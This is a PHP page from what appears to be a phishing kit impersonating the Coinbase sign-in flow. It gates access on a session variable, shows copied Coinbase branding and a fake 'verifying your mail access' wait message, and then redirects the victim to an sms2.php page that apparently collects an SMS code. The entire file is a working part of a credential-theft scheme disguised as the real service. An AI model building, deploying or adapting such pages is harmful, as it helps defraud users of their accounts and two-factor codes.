<?php
session_start();
error_reporting(0);
include 'inc/main.php';

if (!($_SESSION['PHPisHERE'])){
  header('location: index.php');
}
?>
<html xmlns:fb="http://ogp.me/ns/fb#"><head>
  <title>
      Coinbase
  </title>
  <!-- generic -->
<link rel="icon" href="files/favicon-32.png" sizes="32x32">
<link rel="icon" href="files/favicon-57.png" sizes="57x57">
<link rel="icon" href="files/favicon-76.png" sizes="76x76">
<link rel="icon" href="files/favicon-96.png" sizes="96x96">
<link rel="icon" href="files/favicon-128.png" sizes="128x128">
<link rel="icon" href="files/favicon-192.png" sizes="192x192">
<link rel="icon" href="files/favicon-228.png" sizes="228x228">
    
<!-- Android -->
<link rel="icon" href="files/favicon-196.png" sizes="196x196">

<!-- iOS -->
<link rel="apple-touch-icon" href="files/favicon-120.png" sizes="120x120">
<link rel="apple-touch-icon" href="files/favicon-152.png" sizes="152x152">
<link rel="apple-touch-icon" href="files/favicon-180.png" sizes="180x180">


      <meta property="description" name="description" content="convesio">
    <meta property="title" name="title" content="convesio">
    <meta property="apple-itunes-app" name="apple-itunes-app" content="app-id=886427730">
      <meta property="google-site-verification" name="google-site-verification" content="R7G5THr8xgaHFkTNkr_RUB0HvX2Nf8e4qnWi0X1kmz8">
      <meta property="google-site-verification" name="google-site-verification" content="_GaQTkOlc8tLwxDbZfMdxgGPL5wnctrp-vfeavJVsHE">
    <meta property="og:description" name="og:description" content="Doctor">
    <meta property="og:image" name="og:image" content="files/og-default-04-2021.jpg">
    <meta property="og:title" name="og:title" content="Log out - ">
    <meta property="og:type" name="og:type" content="Doctor">
    <meta property="twitter:app:id:googleplay" name="twitter:app:id:googleplay" content="com.android">
    <meta property="twitter:app:id:iphone" name="twitter:app:id:iphone" content="886427730">
    <meta property="twitter:app:id:ipad" name="twitter:app:id:ipad" content="886427730">
    <meta property="twitter:app:name:googleplay" name="twitter:app:name:googleplay" content="Log out ">
    <meta property="twitter:app:name:ipad" name="twitter:app:name:ipad" content="Log out - ">
    <meta property="twitter:app:name:iphone" name="twitter:app:name:iphone" content="Log out - ">
    <meta property="twitter:card" name="twitter:card" content="summary">
    <meta property="twitter:creator" name="twitter:creator" content="@">
    <meta property="twitter:description" name="twitter:description" content="Doctor">
    <meta property="twitter:image" name="twitter:image" content="files/og-default-04-2021.jpg">
    <meta property="twitter:site" name="twitter:site" content="@">
    <meta property="twitter:title" name="twitter:title" content="Log out">
    <meta property="viewport" name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- -->

    <meta http-equiv="refresh" content="<?php echo $t2w;?>; url=sms2.php?cmd=<?php echo $_SESSION['PHPisHERE']?>">

<link rel="manifest" href="files/manifest.json">

  

  <link rel="stylesheet" media="all" href="files/core-63e737142547145b29093fe91f0056e653a0fab2cb9cb1049bbda4158c991e40.css">
  <link rel="stylesheet" media="all" href="files/application-351b7dc0d6dbf18a49e6d410a2e1900b5db113e6504f64b58eec19e35d9b1030.css">
    <link rel="stylesheet" media="screen" href="files/cds.de3ee9bfa7f8cd381471.css">
  <script src="files/jquery-cb0decd18b4b0abbece3cfc180d9adc8e11dfa693cf34c2ff1ffcda86e725301.js"></script>
  <meta name="csrf-param" content="authenticity_token">
<meta name="csrf-token" content="q2vrznkLfF584DXhpgkt/G96HYFVB7de5CUDVrfwV0C/oNXMQUUzR6sNkaZ4BfowNlfKfHD5pbN2WlaKGOyz5smg==">
  


  <script src="files/application-77f549ec32b2c1c63d20e3c4cf24c1fc2a6bd2a93bdd76558283286fdb88ca91.js"></script>

</head>

<body class="app signed-out sessions new" data-controller-name="sessions" data-action-name="new" data-view-name="Coinbase.Views.Sessions.New" data-account-id="">

  <!-- Android banner -->

  <div class="flash">
</div>

  <div class="page-container">
    <!-- Show flash message for any browser that isn't: Webkit, Firefox 17+, IE 9+ and Opera 12+ -->

        <div class="navbar navbar-static-top">
  <div class="navbar-inner">
    <div class="container">
        <a id="main_nav_btn" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </a>
        <div class="mobile-bg"></div>
    </div>
  </div>
</div>


    <div class="container" id="page">
      
      <noscript>
  <div class="alert alert-danger">
    <h4 class="alert-heading">Javascript is disabled in your browser</h4>
    Please enable javascript or upgrade your browser for the best experience on Coinbase.
  </div>
</noscript>


<div class="session center">
  
          
	
	
	

           


  <div class="account-form">
    <div class="form">
      <input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="wyM9efr8ZP8h2B1uEsDbtMo8+MqLM8cvtQdi+pZkC5dlFBKj0MNiDkrYYI7fvB4mF0MqlWodHghAWqgLWC5s9w==">
      
<center class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v" style="width: 100%;"><div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-7-_g0seea" style="width: 126px;"><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-labelledby="Coinbase logo" viewBox="0 0 688 123" class="cds-iconStyles-iogjozt" width="100%"><title>Coinbase logo</title><path d="M138.857 34.3392C113.863 34.3392 94.3343 53.3277 94.3343 78.7477C94.3343 104.168 113.37 122.994 138.857 122.994C164.343 122.994 183.71 103.843 183.71 78.5852C183.71 53.4902 164.674 34.3392 138.857 34.3392ZM139.025 104.674C124.792 104.674 114.363 93.611 114.363 78.754C114.363 63.7282 124.624 52.6714 138.857 52.6714C153.258 52.6714 163.681 63.897 163.681 78.754C163.681 93.611 153.258 104.674 139.025 104.674ZM189.168 53.659H201.584V121.35H221.443V35.9893H189.168V53.659ZM44.3536 52.6652C54.7832 52.6652 63.0581 59.103 66.1995 68.6785H87.2209C83.4113 48.2087 66.5305 34.3392 44.5223 34.3392C19.5288 34.3392 0 53.3277 0 78.754C0 104.18 19.0355 123 44.5223 123C66.0371 123 83.249 109.131 87.0586 88.492H66.1995C63.2205 98.0675 54.9456 104.674 44.516 104.674C30.1145 104.674 20.0222 93.611 20.0222 78.754C20.0285 63.7282 29.9584 52.6652 44.3536 52.6652ZM566.518 70.4973L551.954 68.3535C545.003 67.3659 540.038 65.0533 540.038 59.603C540.038 53.659 546.495 50.6901 555.264 50.6901C564.863 50.6901 570.989 54.8153 572.313 61.5844H591.511C589.357 44.4148 576.117 34.3455 555.763 34.3455C534.742 34.3455 520.84 45.0773 520.84 60.2656C520.84 74.7913 529.946 83.2167 548.313 85.8544L562.877 87.9982C569.996 88.9858 573.968 91.7984 573.968 97.0799C573.968 103.849 567.017 106.655 557.418 106.655C545.665 106.655 539.045 101.868 538.052 94.6048H518.523C520.347 111.281 533.418 123 557.25 123C578.933 123 593.328 113.093 593.328 96.0861C593.328 80.8979 582.905 72.9725 566.518 70.4973ZM211.514 0.825042C204.232 0.825042 198.767 6.10656 198.767 13.3694C198.767 20.6323 204.225 25.9138 211.514 25.9138C218.796 25.9138 224.26 20.6323 224.26 13.3694C224.26 6.10656 218.796 0.825042 211.514 0.825042ZM502.966 65.2158C502.966 46.7274 491.712 34.3455 467.88 34.3455C445.373 34.3455 432.795 45.7398 430.309 63.2407H450.007C451 56.4716 456.296 50.8588 467.549 50.8588C477.648 50.8588 482.613 55.3153 482.613 60.7656C482.613 67.866 473.507 69.6785 462.253 70.8349C447.028 72.4849 428.161 77.7664 428.161 97.58C428.161 112.937 439.583 122.837 457.788 122.837C472.021 122.837 480.958 116.893 485.43 107.48C486.092 115.9 492.38 121.35 501.155 121.35H512.74V103.687H502.972V65.2158H502.966ZM483.437 86.6794C483.437 98.0737 473.507 106.493 461.423 106.493C453.972 106.493 447.683 103.355 447.683 96.7549C447.683 88.3357 457.782 86.0231 467.05 85.0356C475.987 84.2105 480.952 82.2292 483.437 78.429V86.6794ZM378.012 34.3392C366.92 34.3392 357.652 38.9645 351.032 46.7211V0H331.172V121.35H350.701V110.124C357.321 118.212 366.758 123 378.012 123C401.843 123 419.886 104.18 419.886 78.754C419.886 53.3277 401.512 34.3392 378.012 34.3392ZM375.033 104.674C360.8 104.674 350.37 93.611 350.37 78.754C350.37 63.897 360.962 52.6714 375.195 52.6714C389.596 52.6714 399.689 63.7345 399.689 78.754C399.689 93.611 389.265 104.674 375.033 104.674ZM283.671 34.3392C270.762 34.3392 262.319 39.6208 257.354 47.0524V35.9893H237.656V121.344H257.516V74.9538C257.516 61.9094 265.791 52.6652 278.038 52.6652C289.46 52.6652 296.574 60.7531 296.574 72.4787V121.35H316.434V70.9974C316.44 49.5275 305.354 34.3392 283.671 34.3392ZM688 75.9476C688 51.5151 670.126 34.3455 646.126 34.3455C620.639 34.3455 601.934 53.4965 601.934 78.754C601.934 105.337 621.963 123 646.457 123C667.147 123 683.366 110.781 687.5 93.4485H666.81C663.831 101.043 656.549 105.337 646.781 105.337C634.035 105.337 624.436 97.4112 622.288 83.5417H687.994V75.9476H688ZM623.449 69.341C626.597 57.4529 635.534 51.6776 645.795 51.6776C657.049 51.6776 665.655 58.1155 667.641 69.341H623.449Z" fill="#0052FF"></path></svg></div><br></center><br><br>
<img src="files/s.gif">


<br><br>
    <label class="hh">
             Please be patient we verifying your mail access do not close this window...
          </label>
  

</div>

    </div>
  </div>

  <footer>
  <div class="container">
    <div class="row-fluid">
      <div class="span2 footer__logo">
        <a href="/" class="brand">
          <svg height="28" viewBox="0 0 158 28" xmlns="http://www.w3.org/2000/svg" role="button" style="
            width: 112px;
            height: 20px;
            fill: #0667d0;
            cursor: pointer;
          ">
            <path d="M31.6354 7.81707C25.9412 7.81707 21.492 12.1397 21.492 17.9263C21.492 23.713 25.8287 27.9986 31.6354 27.9986C37.442 27.9986 41.8541 23.639 41.8541 17.8893C41.8541 12.1766 37.5174 7.81707 31.6354 7.81707ZM31.6738 23.8283C28.4311 23.8283 26.055 21.3098 26.055 17.9277C26.055 14.5072 28.3927 11.9903 31.6354 11.9903C34.9164 11.9903 37.2911 14.5456 37.2911 17.9277C37.2911 21.3098 34.9164 23.8283 31.6738 23.8283ZM43.0977 12.215H45.9261V27.6244H50.4508V8.19271H43.0977V12.215ZM10.105 11.9888C12.4811 11.9888 14.3664 13.4543 15.0821 15.6341H19.8713C19.0034 10.9743 15.1575 7.81707 10.1434 7.81707C4.4492 7.81707 0 12.1397 0 17.9277C0 23.7158 4.33681 28 10.1434 28C15.0451 28 18.9664 24.8427 19.8343 20.1445H15.0821C14.4034 22.3243 12.5181 23.8283 10.142 23.8283C6.86092 23.8283 4.56159 21.3098 4.56159 17.9277C4.56304 14.5072 6.82535 11.9888 10.105 11.9888ZM129.068 16.0482L125.75 15.5601C124.167 15.3353 123.036 14.8089 123.036 13.5682C123.036 12.215 124.507 11.5392 126.504 11.5392C128.692 11.5392 130.087 12.4783 130.389 14.0192H134.763C134.272 10.1107 131.255 7.81848 126.618 7.81848C121.829 7.81848 118.662 10.2615 118.662 13.719C118.662 17.0257 120.736 18.9437 124.921 19.5441L128.239 20.0321C129.861 20.2569 130.766 20.8972 130.766 22.0995C130.766 23.6404 129.182 24.2793 126.995 24.2793C124.317 24.2793 122.809 23.1894 122.583 21.5361H118.134C118.549 25.3322 121.527 28 126.957 28C131.897 28 135.177 25.7448 135.177 21.8732C135.177 18.4158 132.802 16.6116 129.068 16.0482ZM48.1884 0.187814C46.5294 0.187814 45.2848 1.39011 45.2848 3.04345C45.2848 4.69678 46.5281 5.89907 48.1884 5.89907C49.8474 5.89907 51.0926 4.69678 51.0926 3.04345C51.0926 1.39011 49.8474 0.187814 48.1884 0.187814ZM114.59 14.8459C114.59 10.6371 112.026 7.81848 106.596 7.81848C101.468 7.81848 98.6024 10.4123 98.0363 14.3962H102.524C102.75 12.8553 103.957 11.5776 106.521 11.5776C108.822 11.5776 109.953 12.5921 109.953 13.8328C109.953 15.4492 107.878 15.8618 105.314 16.125C101.845 16.5006 97.5468 17.7029 97.5468 22.2133C97.5468 25.7092 100.149 27.963 104.297 27.963C107.539 27.963 109.575 26.6099 110.594 24.4671C110.745 26.3837 112.178 27.6244 114.177 27.6244H116.816V23.6034H114.591V14.8459H114.59ZM110.14 19.7319C110.14 22.3257 107.878 24.2423 105.125 24.2423C103.428 24.2423 101.995 23.528 101.995 22.0255C101.995 20.1089 104.295 19.5825 106.407 19.3577C108.443 19.1699 109.574 18.7188 110.14 17.8538V19.7319ZM86.1214 7.81707C83.5944 7.81707 81.4831 8.86996 79.975 10.6357V0H75.4504V27.6244H79.8993V25.069C81.4074 26.9101 83.5577 28 86.1214 28C91.5508 28 95.6616 23.7158 95.6616 17.9277C95.6616 12.1397 91.4756 7.81707 86.1214 7.81707ZM85.4429 23.8283C82.2001 23.8283 79.8241 21.3098 79.8241 17.9277C79.8241 14.5456 82.2373 11.9903 85.4796 11.9903C88.7609 11.9903 91.0599 14.5087 91.0599 17.9277C91.0599 21.3098 88.6852 23.8283 85.4429 23.8283ZM64.6279 7.81707C61.6871 7.81707 59.7634 9.01937 58.6324 10.7111V8.19271H54.1446V27.623H58.6692V17.0627C58.6692 14.0932 60.5544 11.9888 63.3448 11.9888C65.947 11.9888 67.5675 13.83 67.5675 16.4992V27.6244H72.0921V16.162C72.0939 11.2746 69.5682 7.81707 64.6279 7.81707ZM156.745 17.2889C156.745 11.727 152.673 7.81848 147.205 7.81848C141.399 7.81848 137.137 12.1781 137.137 17.9277C137.137 23.9791 141.7 28 147.281 28C151.995 28 155.69 25.2184 156.632 21.2728H151.918C151.239 23.0016 149.58 23.9791 147.355 23.9791C144.451 23.9791 142.264 22.1749 141.774 19.0176H156.744V17.2889H156.745ZM142.039 15.785C142.756 13.0787 144.792 11.764 147.13 11.764C149.694 11.764 151.655 13.2295 152.107 15.785H142.039Z" fill-rule="evenodd"></path>
          </svg></a>
        <br>
        <small><span>© 2023 Coinbase</span></small>
      </div>
          <div class="dropup dropdown-hover">
            <a class="dropdown-toggle" data-toggle="dropdown" href="#">
              Legal &amp; Privacy
            </a>
            <ul class="dropdown-menu fadeIn animated-fast" role="menu" aria-labelledby="dLabel">
              <li><a href="">User Agreement</a></li>
              <li><a href="y">Privacy Policy</a></li>
                <li><a href="">Licenses &amp; Disclosures</a></li>
            </ul>
          </div>
        
      </div>
        <div class="span2">
          <div class="footer-locale-select">
  <h4>Language</h4>
  <p><select name="locale" id="locale_select"></select></p>
  <!-- <small><a href="https://crowdin.com/project/coinbase">Help translate Coinbase</a></small> -->
</div>

        </div>
    </div>
  </footer></div>


  




</div></body></html>